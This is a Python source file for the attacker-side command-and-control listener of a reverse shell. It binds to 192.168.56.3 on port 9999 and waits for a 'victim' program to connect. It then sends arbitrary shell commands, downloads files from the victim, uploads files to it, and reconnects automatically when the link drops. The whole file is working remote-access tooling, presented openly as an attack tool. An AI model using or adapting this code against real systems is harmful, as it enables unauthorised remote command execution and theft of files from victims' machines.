import socket
import sys
import time


def send_commands(conn):
    """Function used to send shell commands; additional used commands: quit, download, upload
    """

    victim_response = conn.recv(4096)
    print(victim_response.decode("utf-8"))

    while not victim_response.decode("utf-8"):
        reconnect()

    while True:
        try:
            cmd = input()
            """ In case of quit command, close the connection
            """
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            elif cmd[:8] == 'download':
                """In the case of the 'download' command, receive the needed file using write operation
                """
                conn.send(str.encode(cmd))
                down_file = cmd[9:]
                receive_file = True

                victim_response = conn.recv(1024)

                if victim_response.endswith(b"Requested file not found"):
                    print("Requested file not found on the client")
                    victim_response = conn.recv(4096)
                    print(victim_response.decode("utf-8"))
                else:
                    with open(down_file, 'wb') as f:
                        while receive_file:
                            if victim_response.endswith(b"EOFEOFEOFEOFEOF"):
                                print("Download completed")
                                data = victim_response[:-15]
                                f.write(data)
                                f.close()
                                victim_response = conn.recv(4096)
                                print(victim_response.decode("utf-8"))
                                receive_file = False
                            else:
                                f.write(victim_response)
                                victim_response = conn.recv(1024)
            elif cmd[:6] == 'upload':
                """In the case of the 'upload' command, send the added file to the victim
                """
                file_name = cmd[7:]

                try:
                    with open(file_name, 'rb') as f:
                        conn.send(str.encode(cmd))
                        sending = True
                        while sending:
                            file_to_send = f.read(1024)
                            if file_to_send == b'':
                                print("Upload completed")
                                f.close()
                                time.sleep(0.3)
                                conn.send(str.encode("EOFEOFEOFEOFEOF"))
                                victim_response = conn.recv(4096)
                                print(victim_response.decode("utf-8"))
                                sending = False
                            else:
                                conn.send(file_to_send)
                except FileNotFoundError:
                    print("File not found")
                    print(victim_response.decode("utf-8"))
            elif len(str.encode(cmd)) > 0:
                """In case of other shell commands, sent them to the victim and take the  answer
                """
                nr_bytes = conn.send(str.encode(cmd))
                victim_response = conn.recv(4096)
                print(victim_response.decode("utf-8"))
            elif cmd == '':
                """Otherwise, send "null" to victim and display the current path of the victim
                """
                conn.send(str.encode("null"))
                victim_response = conn.recv(4096)
                print(victim_response.decode("utf-8"))
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            reconnect()


def create_socket():
    """Function used to create the connection with the victim and to manage commands"""
    try:
        global s
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
    try:
        s.bind((host, port))
        s.listen(1)
        print("Listening on " + str(host) + ":" + str(port))
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
    conn, address = s.accept()
    print("Connection has been established: " + "IP " + address[0] + " |  Port " + str(address[1]))
    time.sleep(0.5)
    send_commands(conn)


def reconnect():
    print("Connection with host was lost")
    s.listen(1)
    print("Listening on " + str(host) + ":" + str(port))
    conn, address = s.accept()
    print("Connection has been established: " + "IP " + address[0] + " |  Port " + str(address[1]))
    send_commands(conn)


def main():
    """Function used to set the IP address and port number which should be the same as in the victim's program"""
    global host
    global port
    try:
        host = "192.168.56.3"
        #print("Set LHOST: %s" % host)
        port = 9999
        create_socket()
    except Exception as e:
        print(e)
        main()


if __name__ == "__main__":
    main()
